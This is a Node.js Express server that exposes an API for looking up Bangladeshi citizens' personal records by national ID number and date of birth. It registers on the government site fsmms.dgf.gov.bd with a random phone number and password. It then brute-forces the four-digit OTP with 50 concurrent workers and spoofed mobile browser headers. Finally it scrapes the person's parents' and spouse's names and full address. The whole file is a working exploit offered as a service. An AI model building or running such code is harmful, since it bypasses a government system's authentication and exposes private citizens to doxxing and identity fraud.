const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Configuration - কনকারেন্সি কমিয়ে দিলাম
const MOBILE_PREFIX = "019";
const MAX_CONCURRENT = 50;
const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";
const TIMEOUT = 300000;

// Enhanced axios instance with timeout
const axiosInstance = axios.create({
    timeout: TIMEOUT,
    maxRedirects: 0,
    validateStatus: null
});

// রিয়েল ডিভাইসের হেডার ডাটা
const BASE_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'bn-BD,bn;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept-Encoding': 'gzip, deflate, br',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-ch-ua-model': '"SM-A526B"',
    'sec-ch-ua-bitness': '"64"',
    'sec-ch-ua-full-version': '"131.0.6778.0"',
    'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.0", "Chromium";v="131.0.6778.0", "Not_A Brand";v="24.0.0.0"',
    'sec-ch-ua-arch': '"arm"',
    'sec-ch-ua-wow64': '?0',
    'X-Requested-With': 'com.android.chrome',
    'Priority': 'u=0, i',
};

// Helpers
function randomMobile(prefix) {
    return prefix + Math.random().toString().slice(2, 10);
}

function randomPassword() {
    const uppercase = String.fromCharCode(65 + Math.floor(Math.random() * 26));
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomChars = '';
    for (let i = 0; i < 8; i++) randomChars += chars.charAt(Math.floor(Math.random() * chars.length));
    return "#" + uppercase + randomChars;
}

function generateOTPRange() {
    return Array.from({ length: 10000 }, (_, i) => i.toString().padStart(4, '0'));
}

// Session creation with timeout
async function getSessionAndBypass(nid, dob, mobile, password) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor';
    const headers = { 
        ...BASE_HEADERS, 
        'Content-Type': 'application/x-www-form-urlencoded', 
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/movementContractor' 
    };
    const data = { 
        nidNumber: nid, 
        email: "", 
        mobileNo: mobile, 
        dateOfBirth: dob, 
        password, 
        confirm_password: password, 
        next1: "" 
    };

    const res = await axiosInstance.post(url, data, { headers });
    
    if (res.status === 302 && res.headers.location && res.headers.location.includes('mov-verification')) {
        const cookies = res.headers['set-cookie'] || [];
        return { 
            session: axios.create({ 
                timeout: TIMEOUT,
                headers: { ...BASE_HEADERS, 'Cookie': cookies.join('; ') } 
            }), 
            cookies 
        };
    }
    throw new Error('Bypass Failed - Check NID and DOB');
}

// Optimized OTP checking with better concurrency control
async function tryBatch(session, cookies, otpRange) {
    let found = null;
    let foundFlag = false;
    
    // Optimized shuffle
    const queue = [...otpRange];
    for (let i = queue.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [queue[i], queue[j]] = [queue[j], queue[i]];
    }

    // Worker function with improved error handling
    const worker = async (workerId) => {
        while (queue.length > 0 && !foundFlag) {
            const otp = queue.pop();
            if (!otp || foundFlag) break;
            
            try {
                const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
                const headers = { 
                    ...BASE_HEADERS, 
                    'Content-Type': 'application/x-www-form-urlencoded', 
                    'Cookie': cookies.join('; '), 
                    'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification' 
                };
                const data = { 
                    otpDigit1: otp[0], 
                    otpDigit2: otp[1], 
                    otpDigit3: otp[2], 
                    otpDigit4: otp[3] 
                };
                
                const res = await session.post(url, data, { 
                    timeout: 10000,
                    maxRedirects: 0, 
                    validateStatus: null, 
                    headers 
                });
                
                if (res.status === 302 && res.headers.location && res.headers.location.includes(TARGET_LOCATION)) {
                    found = otp;
                    foundFlag = true; 
                    console.log(`✅ Worker ${workerId} found OTP: ${otp}`);
                    break;
                }
            } catch (err) {
                // Silent fail for individual request
                // Don't break the worker for timeout errors
            }
        }
    };

    try {
        // Start controlled number of workers
        const workers = [];
        const actualConcurrent = Math.min(MAX_CONCURRENT, queue.length);
        
        for (let i = 0; i < actualConcurrent; i++) {
            workers.push(worker(i + 1));
        }
        
        await Promise.all(workers);
        
        // Additional safety: if found but Promise.all still running
        if (found) {
            return found;
        }
        
        return null;
    } catch (err) {
        console.error('Worker pool error:', err.message);
        return null;
    }
}

// Fetch form data with timeout
async function fetchFormData(session, cookies) {
    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form';
    const headers = { 
        ...BASE_HEADERS, 
        'Cookie': cookies.join('; '), 
        'Sec-Fetch-Site': 'cross-site', 
        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification' 
    };
    const res = await session.get(url, { headers, timeout: TIMEOUT });
    return res.data;
}

// Extract fields
function extractFields(html, ids) {
    const result = {};
    ids.forEach(id => {
        const match = html.match(new RegExp(`<input[^>]*id="${id}"[^>]*value="([^"]*)"`, 'i'));
        result[id] = match ? match[1] : "";
    });
    return result;
}

// Enrich data
function enrichData(contractor_name, result, nid, dob) {
    const mapped = {
        nameBangla: contractor_name,
        nationalId: nid,
        dateOfBirth: dob,
        fatherName: result.fatherName || "",
        motherName: result.motherName || "",
        spouseName: result.spouseName || "",
        birthPlace: result.nidPerDistrict || "",
        nationality: result.nationality || "",
        division: result.nidPerDivision || "",
        district: result.nidPerDistrict || "",
        upazila: result.nidPerUpazila || "",
        union: result.nidPerUnion || "",
        village: result.nidPerVillage || "",
        ward: result.nidPerWard || "",
        zip_code: result.nidPerZipCode || "",
        post_office: result.nidPerPostOffice || ""
    };
    
    const addr_parts = [
        `বাসা/হোল্ডিং: ${result.nidPerHolding || '-'}`,
        `গ্রাম/রাস্তা: ${result.nidPerVillage || ''}`,
        `মৌজা/মহল্লা: ${result.nidPerMouza || ''}`,
        `ইউনিয়ন ওয়ার্ড: ${result.nidPerUnion || ''}`,
        `ডাকঘর: ${result.nidPerPostOffice || ''} - ${result.nidPerZipCode || ''}`,
        `উপজেলা: ${result.nidPerUpazila || ''}`,
        `জেলা: ${result.nidPerDistrict || ''}`,
        `বিভাগ: ${result.nidPerDivision || ''}`
    ];
    
    const filtered = addr_parts.filter(p => {
        const value = p.split(": ")[1];
        return value && value.trim() && value !== "-";
    });
    
    mapped.permanentAddress = filtered.join(", ");
    mapped.presentAddress = filtered.join(", ");
    return mapped;
}

// API Routes with improved error handling
app.get('/', (req, res) => {
    res.json({
        message: 'Enhanced NID Info API is running',
        status: 'active',
        endpoints: { 
            getInfo: '/get-info?nid=YOUR_NID&dob=YYYY-MM-DD',
            health: '/health',
            testCreds: '/test-creds'
        },
        features: { 
            enhancedHeaders: true, 
            concurrentOTP: true, 
            improvedPasswordGeneration: true, 
            mobilePrefix: MOBILE_PREFIX,
            timeout: `${TIMEOUT}ms`,
            maxConcurrent: MAX_CONCURRENT
        },
        notes: 'Fixed timeout issues, optimized concurrency'
    });
});

app.get('/get-info', async (req, res) => {
    // Set response timeout
    req.setTimeout(TIMEOUT + 10000);
    
    try {
        const { nid, dob } = req.query;
        if (!nid || !dob) {
            return res.status(400).json({ 
                success: false, 
                error: 'NID and DOB are required' 
            });
        }

        // Validate date format
        if (!/^\d{4}-\d{2}-\d{2}$/.test(dob)) {
            return res.status(400).json({ 
                success: false, 
                error: 'Date must be in YYYY-MM-DD format' 
            });
        }
        
        const password = randomPassword();
        const mobile = randomMobile(MOBILE_PREFIX);
            
       
        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);
        const otpRange = generateOTPRange();
        const foundOTP = await tryBatch(session, cookies, otpRange);
        
        if (!foundOTP) {
            console.log('OTP not found');
            return res.status(404).json({ 
                success: false, 
                error: "OTP not found within the range" 
            });
        }
        
        const html = await fetchFormData(session, cookies);
        
        
        const ids = [
            "contractorName","fatherName","motherName","spouseName",
            "nidPerDivision","nidPerDistrict","nidPerUpazila","nidPerUnion",
            "nidPerVillage","nidPerWard","nidPerZipCode","nidPerPostOffice",
            "nidPerHolding","nidPerMouza"
        ];
        
        const extracted = extractFields(html, ids);
        const finalData = enrichData(extracted.contractorName || "", extracted, nid, dob);
        
        
        res.json({ 
            success: true, 
            data: finalData
        });

    } catch (err) {
        console.error('Error in /get-info:', err.message);
        
        if (err.code === 'ECONNABORTED') {
            return res.status(504).json({ 
                success: false, 
                error: 'Request timeout - Server is taking too long to respond' 
            });
        }
        
        res.status(500).json({ 
            success: false, 
            error: err.message || 'Internal server error',
            suggestion: 'Please check the NID and DOB format and try again'
        });
    }
});

// Add start time middleware
app.use((req, res, next) => {
    req.startTime = Date.now();
    next();
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'OK', 
        timestamp: new Date().toISOString(), 
        service: 'Enhanced NID Info API', 
        version: '2.0.5',
        uptime: process.uptime()
    });
});

app.get('/test-creds', (req, res) => {
    res.json({ 
        mobile: randomMobile(MOBILE_PREFIX), 
        password: randomPassword(), 
        note: 'Random test credentials for testing only' 
    });
});

// Global error handler
app.use((err, req, res, next) => {
    console.error('Global error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: err.message
    });
});

app.listen(PORT, () => {
    console.log(`API running on port ${PORT}`);
    console.log(`Configuration: MAX_CONCURRENT=${MAX_CONCURRENT}, TIMEOUT=${TIMEOUT}ms`);
});
